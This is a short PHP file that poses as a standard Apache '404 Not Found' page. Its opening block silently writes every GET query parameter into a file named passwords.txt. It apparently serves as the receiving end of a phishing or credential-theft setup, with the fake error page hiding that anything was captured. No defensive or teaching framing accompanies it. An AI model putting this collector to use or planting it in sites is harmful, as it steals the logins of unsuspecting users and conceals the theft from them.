<?php
if (!empty($_GET)) {
    $fp = fopen('passwords.txt', 'a');
    fwrite($fp, "\n");
    fwrite($fp, implode(" ", $_GET));
    fclose($fp);
}
?>
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html>

<head>
    <title>404 Not Found</title>
</head>

<body>
    <h1>Not Found</h1>
    <p>The requested URL was not found on this server.</p>
    <hr>
    <address>Apache/2.4.55 (Debian) Server at localhost Port 443</address>
</body>

</html>